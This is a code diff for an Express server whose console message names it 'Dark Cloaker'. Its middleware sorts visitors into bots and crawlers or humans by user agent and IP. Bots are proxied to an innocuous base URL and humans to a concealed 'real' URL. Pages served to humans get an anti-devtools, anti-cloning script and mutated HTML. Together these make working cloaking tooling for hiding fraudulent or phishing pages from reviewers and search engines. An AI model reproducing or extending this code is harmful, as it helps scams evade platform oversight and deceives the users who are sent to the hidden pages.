@@ -16,13 +16,13 @@ app.use(helmet());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// 🔌 Rotas da API
+// 📂 Rotas da API
 const authRoutes = require("./routes/auth.routes");
 const domainRoutes = require("./routes/domain.routes");
 app.use("/api/auth", authRoutes);
 app.use("/api/domain", domainRoutes);
 
-// 🧠 Banco Mongo
+// 🔌 Conexão com MongoDB
 (async () => {
   try {
     await mongoose.connect(process.env.MONGO_URI);
@@ -33,9 +33,12 @@ app.use("/api/domain", domainRoutes);
   }
 })();
 
-// 🛡️ Middleware de Cloaking (proxy cego)
+// ⚔️ Middleware de cloaking cego (pega todas as rotas não-API)
 app.use(async (req, res, next) => {
   try {
+    // Ignora rotas da API
+    if (req.path.startsWith("/api")) return next();
+
     const host = req.hostname;
     const ua = req.headers["user-agent"] || "";
     const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
@@ -43,8 +46,7 @@ app.use(async (req, res, next) => {
     const domain = await Domain.findOne({ officialUrl: `https://${host}` });
     if (!domain) return res.redirect("https://google.com");
 
-    // 🕵️ Detector de bot
-    const isBotVisit = isBot(ua, ip);
+    const isBotVisit = isBot(ua, ip); // true = bot/crawler
     const urlAlvo = isBotVisit ? domain.baseUrl : domain.realUrl;
     const destino = `${urlAlvo}${req.originalUrl}`;
 
@@ -55,9 +57,9 @@ app.use(async (req, res, next) => {
     };
 
     const response = await axios.get(destino, { headers });
-    const html = response.data;
+    let html = response.data;
 
-    // 🧪 Script Anti-devtools e clonagem
+    // 🔐 Anti-clonagem e Devtools
     const antiDebug = `
       <script>
         function devtoolsDetector(){
@@ -82,6 +84,7 @@ app.use(async (req, res, next) => {
 
     let mutado = mutateHTMLSafe(html);
     mutado = mutado.replace("</body>", `${antiDebug}</body>`);
+
     res.setHeader("Content-Type", "text/html; charset=utf-8");
     return res.send(mutado);
 
@@ -91,7 +94,7 @@ app.use(async (req, res, next) => {
   }
 });
 
-// 🚀 Start do servidor
+// 🚀 Iniciar servidor
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => {
   console.log(`☠️ Dark Cloaker rodando blindado na porta ${PORT}`);
